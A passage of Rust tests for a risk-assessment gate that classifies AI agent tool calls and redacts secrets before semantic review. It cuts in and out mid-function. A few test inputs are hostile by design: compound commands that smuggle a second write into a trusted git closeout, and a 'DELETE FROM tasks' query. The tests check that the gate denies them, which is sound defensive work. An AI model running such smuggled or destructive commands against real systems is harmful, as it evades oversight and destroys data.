        let command = "statewright-git-closeout --message 'docs: bounded closeout' -- docs/one.md";

        for ast_authoritative in [false, true] {
            set_test_shell_ast_shadow_enabled(Some(ast_authoritative));
            set_test_shell_ast_authority_enabled(Some(ast_authoritative));
            let pipeline = assess_pipeline_visible_with_runtime(
                None,
                "exec_command",
                &json!({"cmd": command}),
                Some("commit"),
                true,
                &config,
                None,
                std::time::Duration::ZERO,
            )
            .await;

            assert_eq!(pipeline.deterministic.risk, RiskBand::Moderate);
            assert_eq!(pipeline.deterministic.exposure, ExposureBand::Local);
            assert_eq!(pipeline.resolve_effect(), ResolvedEffect::GitLocalWrite);
            assert_eq!(
                pipeline.visible_json()["required_authority"],
                "GitLocalWrite"
            );
        }
        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[tokio::test]
    async fn trusted_git_closeout_cannot_launder_compound_writes() {
        let config =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), Some("true"), None);
        for command in [
            "statewright-git-closeout --message test -- docs/one.md && mkdir escaped",
            "statewright-git-closeout --message test -- docs/one.md > receipt",
        ] {
            for ast_authoritative in [false, true] {
                set_test_shell_ast_shadow_enabled(Some(ast_authoritative));
                set_test_shell_ast_authority_enabled(Some(ast_authoritative));
                let pipeline = assess_pipeline_visible_with_runtime(
                    None,
                    "exec_command",
                    &json!({"cmd": command}),
                    Some("commit"),
                    true,
                    &config,
                    None,
                    std::time::Duration::ZERO,
                )
                .await;

                assert_ne!(
                    pipeline.resolve_effect(),
                    ResolvedEffect::GitLocalWrite,
                    "compound command must not inherit GitLocalWrite: {command}"
                );
            }
        }
        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn mcp_intent_uses_operation_not_server_namespace_and_respects_negative_hints() {
        assert_eq!(
            assess_mcp(None, "mcp__delete__list_tasks").risk,
            RiskBand::Low
        );
        assert_eq!(
            assess_mcp(None, "mcp__tasks__delete__list_tasks").risk,
            RiskBand::High
        );
        assert_eq!(
            assess_mcp(None, "mcp__search__opaque").exposure,
            ExposureBand::Unknown
        );
        assert_eq!(
            assess_mcp(None, "mcp__gtasks_work__update").exposure,
            ExposureBand::Unknown
        );
        let contradictory: ToolInfo = serde_json::from_value(json!({
            "name":"list_tasks", "inputSchema":{},
            "annotations":{"readOnlyHint":true,"destructiveHint":true}
        }))
        .unwrap();
        assert_eq!(
            assess_mcp(Some(&contradictory), "list_tasks").risk,
            RiskBand::Critical
        );
        let mutating_reader: ToolInfo = serde_json::from_value(json!({
            "name":"get_and_mark_read", "inputSchema":{},
            "annotations":{"readOnlyHint":false}
        }))
        .unwrap();
        assert_ne!(
            assess_mcp(Some(&mutating_reader), "get_and_mark_read").risk,
            RiskBand::Low
        );
        let closed_world: ToolInfo = serde_json::from_value(json!({
            "name":"update_task", "inputSchema":{}, "annotations":{"openWorldHint":false}
        }))
        .unwrap();
        assert_eq!(
            assess_mcp(Some(&closed_world), "update_task").exposure,
            ExposureBand::Unknown
        );
    }

    #[test]
    fn mcp_invocation_carries_redacted_selector_intent_not_private_payload() {
        let tool: ToolInfo = serde_json::from_value(json!({
            "name":"mcp__tasks__manage", "description":"private-description-sentinel",
            "inputSchema":{"type":"object","properties":{
                "action":{"type":"string","enum":["list","delete"]},
                "title":{"type":"string","default":"private-schema-sentinel"}
            }}
        }))
        .unwrap();
        let deletion = assess_invocation(
            Some(&tool),
            &tool.name,
            &json!({"action":"delete","title":"private-title-sentinel"}),
            None,
        );
        assert_eq!(deletion.risk, RiskBand::High);
        let request = serde_json::to_value(deletion.semantic_request.unwrap()).unwrap();
        assert_eq!(request["mcp_shape"]["selector_intent"], "destructive");
        assert_eq!(request["mcp_shape"]["registered_metadata"], true);
        assert_eq!(request["mcp_shape"]["schema_has_selector"], true);
        assert!(!request.to_string().contains("sentinel"));
        let opaque = assess_invocation(
            Some(&tool),
            &tool.name,
            &json!({"action":"private-unknown-sentinel"}),
            None,
        );
        assert!(
            !serde_json::to_string(&opaque.semantic_request)
                .unwrap()
                .contains("sentinel")
        );
    }

    #[test]
    fn mcp_model_cannot_erase_mutation_evidence_or_judge_hidden_execution_payloads() {
        let confident = SemanticRiskVector {
            read_only: Probability::new(0.99).unwrap(),
            may_write: Probability::new(0.01).unwrap(),
            reversible: Probability::new(0.99).unwrap(),
            destructive: Probability::new(0.0).unwrap(),
            irreversible: Probability::new(0.0).unwrap(),
            external_or_account_effect: Probability::new(0.0).unwrap(),
        };
        let pipeline = |name, args: serde_json::Value, enabled, status| {
            let deterministic = assess_invocation(None, name, &args, None);
            RiskPipelineAssessment {
                effective_risk: deterministic.risk,
                deterministic,
                semantic: SemanticAssessmentReceipt {
                    tool: name.into(),
                    status,
                    vector: Some(confident.clone()),
                    state_intent: None,
                },
                semantic_authorization_enabled: enabled,
                semantic_failsafe_escalated: false,
            }
        };
        for (name, args) in [
            ("mcp__tasks__update", json!({"title":"private"})),
            ("mcp__tasks__manage", json!({"action":"update"})),
            ("mcp__tasks__manage", json!({"action":"unrecognized"})),
            (
                "mcp__db__execute_query",
                json!({"query":"DELETE FROM tasks"}),
            ),
        ] {
            assert_eq!(
                pipeline(name, args, true, SemanticAssessorStatus::Assessed).resolve_effect(),
                ResolvedEffect::DenyUncertain
            );
        }
        let name = "mcp__tasks__manage";
        assert_eq!(
            pipeline(
                name,
                json!({"action":"list"}),
                true,
                SemanticAssessorStatus::Assessed
            )
            .resolve_effect(),
            ResolvedEffect::ReadOnly
        );
        assert_eq!(
            pipeline(
                name,
                json!({"action":"list"}),
                false,
                SemanticAssessorStatus::Assessed
            )
            .resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        for status in [
            SemanticAssessorStatus::Timeout,
            SemanticAssessorStatus::Unavailable,
            SemanticAssessorStatus::Malformed,
            SemanticAssessorStatus::QueueFull,
        ] {
            assert_eq!(
                pipeline(name, json!({"action":"list"}), true, status).resolve_effect(),
                ResolvedEffect::DenyUncertain
            );
        }
    }

    #[test]
    fn shadow_gate_is_disabled_by_default_and_requires_explicit_opt_in() {
        assert!(!shadow_enabled_for(None));
        assert!(!shadow_enabled_for(Some("0")));
        assert!(shadow_enabled_for(Some("1")));
        assert!(shadow_enabled_for(Some("true")));
    }

    #[test]
    fn shadow_receipt_is_opt_in_and_never_accepts_invocation_arguments() {
        let assessment = assess_invocation(
            None,
            "Bash",
            &json!({"command":"rg policy crates"}),
            Some("inspect"),
        );
        let _ = take_test_semantic_receipts();
        assert!(!emit_shadow_when(false, "exec_command", &assessment));
        assert!(take_test_semantic_receipts().is_empty());
        assert!(emit_shadow_when(true, "exec_command", &assessment));
        // The receipt API takes only a tool name and bounded assessment: callers
        // cannot supply command text, paths, secrets, or JSON arguments.
    }

    #[test]
    fn test_receipt_capture_is_thread_local_and_redacted() {
        set_test_shadow_enabled(Some(true));
        let assessment = assess_shell("rg policy crates");
        assert!(emit_shadow("exec_command", &assessment));
        let receipts = take_test_shadow_receipts();
        assert_eq!(receipts.len(), 1);
        assert_eq!(receipts[0].tool, "exec_command");
        assert!(!format!("{:?}", receipts[0]).contains("rg policy crates"));
        set_test_shadow_enabled(None);
    }

    #[test]
    fn probabilities_are_bounded_and_dimensions_are_independent() {
        assert_eq!(
            Probability::new(-0.01),
            Err("probability must be finite and within 0.0..=1.0")
        );
        assert_eq!(
            Probability::new(1.01),
            Err("probability must be finite and within 0.0..=1.0")
        );
        assert!(Probability::new(f32::NAN).is_err());
        let vector = SemanticRiskVector {
            read_only: Probability::new(0.2).unwrap(),
            may_write: Probability::new(0.7).unwrap(),
            reversible: Probability::new(0.7).unwrap(),
            destructive: Probability::new(0.1).unwrap(),
            irreversible: Probability::new(0.4).unwrap(),
            external_or_account_effect: Probability::new(0.3).unwrap(),
        };
        // No pair is forced to sum to one: these are independent properties.
        assert_ne!(vector.reversible.get() + vector.irreversible.get(), 1.0);
        assert_ne!(vector.read_only.get() + vector.may_write.get(), 1.0);
    }

    #[test]
    fn semantic_request_redacts_argument_values_and_shell_paths() {
        let assessment = assess_invocation(
            None,
            "Bash",
            &json!({
                "command": "git --config-env=secret_key=PASSWORD diff /private/plan.txt --no-textconv",
                "token": "super-secret"
            }),
            Some("exploratory_read_only"),
        );
        let request = assessment.semantic_request.unwrap();
        assert_eq!(request.tool_family, "shell");
        assert_eq!(request.shell_shape.len(), 1);
        assert_eq!(request.shell_shape[0].executable, "git");
        assert!(request.shell_shape[0].operation.is_none());
        assert_eq!(request.argument_keys, vec!["command".to_string()]);
        let rendered = format!("{:?}", request);
        assert!(!rendered.contains("super-secret"));
        assert!(!rendered.contains("/private/plan.txt"));
        assert!(!rendered.contains("PASSWORD"));
    }

    #[test]
    fn semantic_shell_shape_omits_secrets_operands_and_ambiguous_short_flags() {
        let assessment = assess_invocation(
            None,
            "Bash",
            &json!({
                "command": "API_TOKEN=super-secret /usr/bin/git -phunter2 --no-textconv /private/plan.txt"
            }),
            Some("exploratory_read_only"),
        );
        let request = assessment.semantic_request.unwrap();
        assert_eq!(request.shell_shape.len(), 1);
        assert_eq!(request.shell_shape[0].executable, "git");
        assert!(request.shell_shape[0].operation.is_none());
        let rendered = format!("{:?}", request);
        assert!(!rendered.contains("API_TOKEN"));
        assert!(!rendered.contains("super-secret"));
        assert!(!rendered.contains("hunter2"));
        assert!(!rendered.contains("/private/plan.txt"));
    }

    #[test]
    fn semantic_request_omits_unknown_keys_and_oversized_metadata() {
        let oversized = "x".repeat(65);
        let assessment = assess_invocation(
            None,
            &oversized,
            &json!({"token": "secret", "path": "/private/plan.txt", "x-secret-key": "also-secret"}),
            Some(&oversized),
        );
        let request = assessment.semantic_request.unwrap();
        assert_eq!(request.tool_name, "unknown");
        assert_eq!(request.state_intent.as_deref(), Some("unknown"));
        assert_eq!(request.argument_keys, vec!["path".to_string()]);
        assert!(!format!("{:?}", request).contains("secret"));
    }

    #[test]
    fn semantic_receipts_use_only_the_bounded_request_tool_label() {
        struct UnusedAssessor;
        impl SemanticAssessor for UnusedAssessor {
            fn assess(
                &self,
                _: &SemanticAssessmentRequest,
            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
                unreachable!("the disabled path does not invoke an assessor")
            }
        }
        let oversized = "untrusted-tool-name-".repeat(8);
        let assessment =
            assess_invocation(None, &oversized, &json!({"path":"/private/secret"}), None);
        let request = assessment.semantic_request.unwrap();
        let receipt = semantic_receipt(&request, SemanticAssessorStatus::Disabled);
        assert_eq!(receipt.tool, "unknown");
        assert!(!format!("{:?}", receipt).contains("untrusted-tool-name"));

        let evaluated = evaluate_semantic::<UnusedAssessor>(&oversized, &request, None);
        assert_eq!(evaluated.tool, "unknown");
        assert!(!format!("{:?}", evaluated).contains("untrusted-tool-name"));
    }

    #[test]
    fn disabled_semantic_dispatch_does_not_change_the_deterministic_receipt() {
        set_test_shadow_enabled(Some(true));
        let _ = take_test_shadow_receipts();
        let assessment = assess_invocation(
            None,
            "Bash",
            &json!({"command":"rg policy crates"}),
            Some("exploratory_read_only"),
        );
        assert!(emit_shadow("Bash", &assessment));
        let deterministic = take_test_shadow_receipts();
        let request = assessment.semantic_request.as_ref().unwrap();
        let semantic = dispatch_semantic_shadow(
            &SemanticShadowConfig::from_values(Some("production"), Some("true"), None, None),
            None,
            request,
        )
        .unwrap();
        assert_eq!(deterministic.len(), 1);
        assert_eq!(deterministic[0].risk, RiskBand::Low);
        assert_eq!(semantic.status, SemanticAssessorStatus::Disabled);
        assert!(semantic.vector.is_none());
        assert!(!format!("{:?}", semantic).contains("rg policy crates"));
        set_test_shadow_enabled(None);
    }

    #[test]
    fn provider_neutral_assessor_can_return_an_independent_vector() {
        struct FakeAssessor;
        impl SemanticAssessor for FakeAssessor {
            fn assess(
                &self,
                _: &SemanticAssessmentRequest,
            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
                Ok(SemanticRiskVector {
                    read_only: Probability::new(0.99).unwrap(),
                    may_write: Probability::new(0.01).unwrap(),
                    reversible: Probability::new(0.8).unwrap(),
                    destructive: Probability::new(0.0).unwrap(),
                    irreversible: Probability::new(0.0).unwrap(),
                    external_or_account_effect: Probability::new(0.0).unwrap(),
                })
            }
        }
        let request = semantic_request(
            None,
            "read_file",
            &json!({"path":"/private/secret.txt"}),
            None,
            false,
        );
        let vector = FakeAssessor.assess(&request).unwrap();
        assert_eq!(vector.read_only.get(), 0.99);
        assert_eq!(vector.may_write.get(), 0.01);
        assert_eq!(request.argument_keys, vec!["path".to_string()]);
    }

    #[test]
    fn fake_assessor_covers_representative_operation_classes() {
        struct MatrixAssessor;
        impl SemanticAssessor for MatrixAssessor {
            fn assess(
                &self,
                request: &SemanticAssessmentRequest,
            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
                let (read_only, may_write, reversible, destructive, irreversible, external) =
                    match request.tool_name.as_str() {
                        "read_file" => (0.99, 0.01, 1.0, 0.0, 0.0, 0.0),
                        "write_file" => (0.05, 0.95, 0.95, 0.05, 0.05, 0.0),
                        "delete_file" => (0.0, 1.0, 0.1, 0.99, 0.95, 0.0),
                        "account_mutation" => (0.0, 1.0, 0.4, 0.5, 0.5, 0.99),
                        _ => (0.5, 0.5, 0.5, 0.5, 0.5, 0.5),
                    };
                Ok(SemanticRiskVector {
                    read_only: Probability::new(read_only).unwrap(),
                    may_write: Probability::new(may_write).unwrap(),
                    reversible: Probability::new(reversible).unwrap(),
                    destructive: Probability::new(destructive).unwrap(),
                    irreversible: Probability::new(irreversible).unwrap(),
                    external_or_account_effect: Probability::new(external).unwrap(),
                })
            }
        }
        let assessor = MatrixAssessor;
        for (tool_name, expected_read_only, expected_destructive, expected_external) in [
            ("read_file", 0.99, 0.0, 0.0),
            ("write_file", 0.05, 0.05, 0.0),
            ("delete_file", 0.0, 0.99, 0.0),
            ("account_mutation", 0.0, 0.5, 0.99),
            ("unknown", 0.5, 0.5, 0.5),
        ] {
            let request =
                semantic_request(None, tool_name, &json!({"value":"redacted"}), None, false);
            let receipt = evaluate_semantic(tool_name, &request, Some(&assessor));
            let vector = receipt.vector.unwrap();
            assert_eq!(receipt.status, SemanticAssessorStatus::Assessed);
            assert_eq!(vector.read_only.get(), expected_read_only);
            assert_eq!(vector.destructive.get(), expected_destructive);
            assert_eq!(vector.external_or_account_effect.get(), expected_external);
        }
    }

    #[test]
    fn semantic_evaluation_records_disabled_and_provider_failures_without_a_policy_decision() {
        struct FailingAssessor(SemanticAssessorStatus);
        impl SemanticAssessor for FailingAssessor {
            fn assess(
                &self,
                _: &SemanticAssessmentRequest,
            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
                Err(self.0)
            }
        }
        let request = semantic_request(
            None,
            "opaque",
            &json!({"value":"secret"}),
            Some("inspect"),
            false,
        );
        assert_eq!(
            evaluate_semantic::<FailingAssessor>("opaque", &request, None).status,
            SemanticAssessorStatus::Disabled,
        );
        for status in [
            SemanticAssessorStatus::Unavailable,
            SemanticAssessorStatus::Timeout,
            SemanticAssessorStatus::Malformed,
            SemanticAssessorStatus::QueueFull,
        ] {
            let receipt = evaluate_semantic("opaque", &request, Some(&FailingAssessor(status)));
            assert_eq!(receipt.status, status);
            assert!(receipt.vector.is_none());
            assert!(!format!("{:?}", receipt).contains("secret"));
        }
    }

    #[test]
    fn semantic_config_requires_staging_and_bounds_queue_capacity() {
        assert!(
            !SemanticShadowConfig::from_values(Some("production"), Some("true"), None, Some("2"))
                .enabled
        );
        assert!(
            SemanticShadowConfig::from_values(Some("production"), None, Some("true"), Some("2"))
                .enabled
        );
        let configured =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, Some("2"));
        assert!(configured.enabled);
        assert_eq!(configured.queue_capacity, 2);
        assert_eq!(
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, Some("0"))
                .queue_capacity,
            64
        );
        assert_eq!(
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, Some("2048"))
                .queue_capacity,
            64
        );
    }

    #[test]
    fn provider_config_never_forwards_an_ambient_typesafe_key_to_local_openai() {
        for kind in [Some("openai_compatible"), None] {
            let local = SemanticProviderConfig::from_values(
                kind,
                Some("http://127.0.0.1:11434/v1"),
                Some("local-model"),
                None,
                Some("private-typesafe-key"),
                None,
            )
            .unwrap();
            assert_eq!(local.kind, SemanticProviderKind::OpenAiCompatible);
            assert!(local.bearer_token.is_none());
        }
        let typesafe = SemanticProviderConfig::from_values(
            None,
            None,
            None,
            None,
            Some("private-typesafe-key"),
            None,
        )
        .unwrap();
        assert_eq!(typesafe.kind, SemanticProviderKind::TypeSafeSystemOne);
        assert_eq!(
            typesafe.bearer_token.as_deref(),
            Some("private-typesafe-key")
        );
    }

    #[tokio::test]
    async fn provider_returns_redacted_assessed_vector() {
        use axum::{Json, Router, routing::post};
        use std::sync::{Arc, Mutex};
        let (seen_sender, seen_receiver) = tokio::sync::oneshot::channel();
        let seen_sender = Arc::new(Mutex::new(Some(seen_sender)));
        let app = Router::new().route("/chat/completions", post({
            let seen_sender = seen_sender.clone();
            move |Json(body): Json<serde_json::Value>| {
                let seen_sender = seen_sender.clone();
                async move {
                    if let Some(sender) = seen_sender.lock().unwrap().take() { let _ = sender.send(body); }
                    Json(json!({"choices":[{"message":{"content":r#"{"read_only":0.1,"may_write":0.9,"reversible":0.7,"destructive":0.1,"irreversible":0.1,"external_or_account_effect":0.95}"#}}]}))
                }
            }
        }));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let endpoint = format!("http://{}", listener.local_addr().unwrap());
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });
        let config =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, Some("1"));
        let provider = SemanticProviderConfig {
            kind: SemanticProviderKind::OpenAiCompatible,
            endpoint,
            model: "test".into(),
            bearer_token: None,
            timeout: std::time::Duration::from_secs(1),
        };
        let (receipt_sender, _receipt_receiver) = mpsc::channel(1);
        let runtime = start_semantic_shadow_runtime(&config, receipt_sender, provider.clone());
        let pipeline = assess_pipeline_visible_with_runtime(
            None,
            "read_file",
            &json!({"path":"/private/secret"}),
            Some("inspect"),
            false,
            &config,
            Some(&runtime),
            provider.timeout,
        )
        .await;
        assert_eq!(pipeline.semantic.status, SemanticAssessorStatus::Assessed);
        assert_eq!(
            pipeline
                .semantic
                .vector
                .unwrap()
                .external_or_account_effect
                .get(),
            0.95
        );
        assert_eq!(pipeline.deterministic.risk, RiskBand::Low);
        assert_eq!(pipeline.effective_risk, RiskBand::Low);
        assert!(!pipeline.semantic_failsafe_escalated);
        let seen = seen_receiver.await.unwrap().to_string();
        assert!(!seen.contains("/private/secret"));
        assert!(seen.contains("shell_shape"));
        assert!(!seen.contains("shell_ast_shape"));
    }

    #[tokio::test]
    async fn typesafe_system_one_provider_uses_typed_nouls_and_redacted_state() {
        use axum::{Json, Router, routing::post};
        use std::sync::{Arc, Mutex};
        let (seen_sender, seen_receiver) = tokio::sync::oneshot::channel();
        let seen_sender = Arc::new(Mutex::new(Some(seen_sender)));
        let app = Router::new().route(
            "/v1/systemone",
            post({
                let seen_sender = seen_sender.clone();
                move |Json(body): Json<serde_json::Value>| {
                    let seen_sender = seen_sender.clone();
                    async move {
                        if let Some(sender) = seen_sender.lock().unwrap().take() {
                            let _ = sender.send(body);
                        }
                        Json(json!({
                            "model":"jev-test",
                            "answers": {
                                "read_only":{"type":"noul","noul":0.98},
                                "may_write":{"type":"noul","noul":0.01},
                                "reversible":{"type":"noul","noul":0.99},
                                "destructive":{"type":"noul","noul":0.01},
                                "irreversible":{"type":"noul","noul":0.01},
                                "external_or_account_effect":{"type":"noul","noul":0.01}
                            },
                            "usage":{"input_tokens":1,"output_tokens":1}
                        }))
                    }
                }
            }),
        );
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let endpoint = format!("http://{}/v1/systemone", listener.local_addr().unwrap());
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });
        let provider = SemanticProviderConfig {
            kind: SemanticProviderKind::TypeSafeSystemOne,
            endpoint,
            model: "jev-latest".into(),
            bearer_token: Some("test-token".into()),
            timeout: std::time::Duration::from_secs(1),
        };
        let tool: ToolInfo = serde_json::from_value(json!({
            "name":"mcp__tasks__manage", "description":"private-description",
            "inputSchema":{"properties":{"action":{"enum":["list","update"]}}}
        }))
        .unwrap();
        let config = SemanticShadowConfig::from_values(None, None, Some("true"), Some("1"));
        let (sender, _receiver) = mpsc::channel(1);
        let runtime = start_semantic_shadow_runtime(&config, sender, provider.clone());
        let pipeline = assess_pipeline_visible_with_runtime(
            Some(&tool),
            &tool.name,
            &json!({"action":"list","title":"private-task-title","token":"private-token"}),
            Some("inspect"),
            false,
            &config,
            Some(&runtime),
            provider.timeout,
        )
        .await;
        assert_eq!(pipeline.deterministic.risk, RiskBand::Moderate);
        assert_eq!(pipeline.semantic.status, SemanticAssessorStatus::Assessed);
        assert_eq!(pipeline.resolve_effect(), ResolvedEffect::ReadOnly);
        let seen = seen_receiver.await.unwrap();
        assert_eq!(seen["model"], "jev-latest");
        assert_eq!(seen["questions"]["read_only"]["type"], "noul");
        assert!(
            seen["questions"]
                .as_object()
                .is_some_and(|questions| questions.len() == 6)
        );
        let rendered = seen.to_string();
        assert_eq!(seen["state"]["mcp_shape"]["selector_intent"], "read");
        assert_eq!(seen["state"]["mcp_shape"]["registered_metadata"], true);
        assert!(!rendered.contains("private-"));
    }

    #[tokio::test]
    async fn provider_body_timeout_is_not_reported_as_malformed() {
        use axum::{
            Router,
            body::{Body, Bytes},
            response::Response,
            routing::post,
        };
        use std::convert::Infallible;
        use tokio_stream::wrappers::ReceiverStream;

        let app = Router::new().route(
            "/chat/completions",
            post(|| async {
                let (sender, receiver) = mpsc::channel(1);
                tokio::spawn(async move {
                    let _ = sender
                        .send(Ok::<Bytes, Infallible>(Bytes::from_static(
                            b"{\"choices\":",
                        )))
                        .await;
                    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                });
                Response::builder()
                    .header("content-type", "application/json")
                    .body(Body::from_stream(ReceiverStream::new(receiver)))
                    .unwrap()
            }),
        );
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let endpoint = format!("http://{}", listener.local_addr().unwrap());
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });
        let provider = SemanticProviderConfig {
            kind: SemanticProviderKind::OpenAiCompatible,
            endpoint,
            model: "test".into(),
            bearer_token: None,
            timeout: std::time::Duration::from_millis(20),
        };
        let client = reqwest::Client::builder()
            .timeout(provider.timeout)
            .build()
            .unwrap();
        let request = semantic_request(
            None,
            "read_file",
            &json!({"path":"/private/secret"}),
            Some("inspect"),
            false,
        );
        assert_eq!(
            assess_with_provider(&client, &provider, &request).await,
            Err(SemanticAssessorStatus::Timeout)
        );
    }

    #[tokio::test]
    async fn semantic_queue_reports_full_and_closed() {
        let request = semantic_request(
            None,
            "read_file",
            &json!({"path":"/private/secret"}),
            Some("inspect"),
            false,
        );
        let (full_queue, _full_receiver) = SemanticAssessmentQueue::new(1);
        assert!(full_queue.try_submit(request.clone()).is_ok());
        assert_eq!(
            full_queue.try_submit(request.clone()),
            Err(SemanticAssessorStatus::QueueFull)
        );

        let (closed_queue, closed_receiver) = SemanticAssessmentQueue::new(1);
        drop(closed_receiver);
        assert_eq!(
            closed_queue.try_submit(request.clone()),
            Err(SemanticAssessorStatus::Unavailable)
        );
    }

    #[tokio::test]
    async fn semantic_dispatcher_uses_explicit_staging_config_and_bounded_worker() {
        use axum::{Router, http::StatusCode, routing::post};

        let request = semantic_request(
            None,
            "read_file",
            &json!({"path":"/private/secret"}),
            Some("inspect"),
            false,
        );
        let disabled =
            SemanticShadowConfig::from_values(Some("production"), Some("true"), None, None);
        let disabled_receipt = dispatch_semantic_shadow(&disabled, None, &request).unwrap();
        assert_eq!(disabled_receipt.status, SemanticAssessorStatus::Disabled);

        let enabled =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, Some("1"));
        let (receipt_sender, mut receipt_receiver) = mpsc::channel(1);
        // Use a deterministic loopback 503 rather than an assumed-unused port.
        // On some hosts a refused connection can consume most of the client
        // deadline under concurrent tests, which made the worker assertion
        // spuriously fail without exercising a different product behavior.
        let app = Router::new().route(
            "/chat/completions",
            post(|| async { StatusCode::SERVICE_UNAVAILABLE }),
        );
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let endpoint = format!("http://{}", listener.local_addr().unwrap());
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });
        let provider = SemanticProviderConfig {
            kind: SemanticProviderKind::OpenAiCompatible,
            endpoint,
            model: "test".into(),
            bearer_token: None,
            timeout: std::time::Duration::from_secs(1),
        };
        let runtime = start_semantic_shadow_runtime(&enabled, receipt_sender, provider);
        assert!(dispatch_semantic_shadow(&enabled, Some(&runtime), &request).is_none());
        let receipt =
            tokio::time::timeout(std::time::Duration::from_secs(1), receipt_receiver.recv())
                .await
                .expect("bounded worker should emit promptly")
                .expect("bounded receipt sender should remain open");
        assert_eq!(receipt.status, SemanticAssessorStatus::Unavailable);
        assert!(receipt.vector.is_none());
    }

    #[test]
    fn full_bounded_receipt_channel_drops_telemetry_immediately() {
        let request = semantic_request(
            None,
            "read_file",
            &json!({"path":"/private/secret"}),
            Some("inspect"),
            false,
        );
        let (receipt_sender, mut receipt_receiver) = mpsc::channel(1);
        assert!(
            receipt_sender
                .try_send(semantic_receipt(&request, SemanticAssessorStatus::Disabled))
                .is_ok()
        );
        assert!(!try_emit_semantic_receipt(
            &receipt_sender,
            semantic_receipt(&request, SemanticAssessorStatus::Unavailable),
        ));
        assert_eq!(
            receipt_receiver.try_recv().unwrap().status,
            SemanticAssessorStatus::Disabled
        );
        assert!(receipt_receiver.try_recv().is_err());
    }

    #[test]
    fn visible_pipeline_keeps_proven_deterministic_effects_authoritative() {
        struct Failsafe;
        impl SemanticAssessor for Failsafe {
            fn assess(
                &self,
                _: &SemanticAssessmentRequest,
            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
                Ok(SemanticRiskVector {
                    read_only: Probability::new(0.99).unwrap(),
                    may_write: Probability::new(0.01).unwrap(),
                    reversible: Probability::new(0.1).unwrap(),
                    destructive: Probability::new(0.91).unwrap(),
                    irreversible: Probability::new(0.9).unwrap(),
                    external_or_account_effect: Probability::new(0.0).unwrap(),
                })
            }
        }
        let enabled = SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, None);
        let pipeline = assess_pipeline_with_config(
            None,
            "read_file",
            &json!({"path":"/private/secret.txt"}),
            Some("inspect"),
            Some(&Failsafe),
            &enabled,
        );
        assert_eq!(pipeline.deterministic.risk, RiskBand::Low);
        assert_eq!(pipeline.effective_risk, RiskBand::Low);
        assert!(!pipeline.semantic_failsafe_escalated);
        let visible = pipeline.visible_json();
        assert_eq!(visible["semantic_status"], "Assessed");
        assert_eq!(visible["effective_risk"], "Low");
        assert!(!visible.to_string().contains("/private/secret.txt"));

        let disabled =
            SemanticShadowConfig::from_values(Some("production"), Some("true"), None, None);
        let unavailable = assess_pipeline_with_config::<Failsafe>(
            None,
            "read_file",
            &json!({"path":"/private/secret.txt"}),
            Some("inspect"),
            None,
            &disabled,
        );
        assert_eq!(
            unavailable.semantic.status,
            SemanticAssessorStatus::Disabled
        );
        assert_eq!(unavailable.effective_risk, unavailable.deterministic.risk);
        assert!(!unavailable.semantic_failsafe_escalated);
    }

    #[test]
    fn semantic_failsafe_is_authoritative_only_for_unknown_effect_fallthroughs() {
        let vector =
            |may_write, destructive, irreversible, external_or_account_effect| SemanticRiskVector {
                read_only: Probability::new(0.99).unwrap(),
                may_write: Probability::new(may_write).unwrap(),
                reversible: Probability::new(0.99).unwrap(),
                destructive: Probability::new(destructive).unwrap(),
                irreversible: Probability::new(irreversible).unwrap(),
                external_or_account_effect: Probability::new(external_or_account_effect).unwrap(),
            };
        let assessed = |vector| SemanticAssessmentReceipt {
            tool: "read_file".to_owned(),
            status: SemanticAssessorStatus::Assessed,
            vector: Some(vector),
            state_intent: Some("inspect".to_owned()),
        };
        let cases = [
            (
                assessment(RiskBand::Low, ExposureBand::Local, "test"),
                assessed(vector(0.91, 0.91, 0.91, 0.91)),
                RiskBand::Low,
                false,
            ),
            (
                assessment(RiskBand::Moderate, ExposureBand::Local, "test"),
                assessed(vector(0.01, 0.91, 0.91, 0.91)),
                RiskBand::Moderate,
                false,
            ),
            (
                assessment(RiskBand::Moderate, ExposureBand::Unknown, "test"),
                assessed(vector(0.91, 0.01, 0.01, 0.01)),
                RiskBand::Moderate,
                false,
            ),
            (
                assessment(RiskBand::Moderate, ExposureBand::Unknown, "test"),
                assessed(vector(0.01, 0.01, 0.01, 0.91)),
                RiskBand::High,
                true,
            ),
            (
                assessment(RiskBand::Moderate, ExposureBand::Unknown, "test"),
                assessed(vector(0.01, 0.91, 0.01, 0.01)),
                RiskBand::Critical,
                true,
            ),
            (
                assessment(RiskBand::Critical, ExposureBand::Account, "test"),
                assessed(vector(0.01, 0.01, 0.01, 0.01)),
                RiskBand::Critical,
                false,
            ),
        ];
        for (deterministic, semantic, expected, escalated) in cases {
            let pipeline = pipeline_from_parts(deterministic, semantic, false);
            assert_eq!(pipeline.effective_risk, expected);
            assert_eq!(pipeline.semantic_failsafe_escalated, escalated);
        }

        let request = semantic_request(
            None,
            "read_file",
            &json!({"path":"/private/secret.txt"}),
            Some("inspect"),
            false,
        );
        for status in [
            SemanticAssessorStatus::Disabled,
            SemanticAssessorStatus::Queued,
            SemanticAssessorStatus::Unavailable,
            SemanticAssessorStatus::Timeout,
            SemanticAssessorStatus::Malformed,
            SemanticAssessorStatus::QueueFull,
        ] {
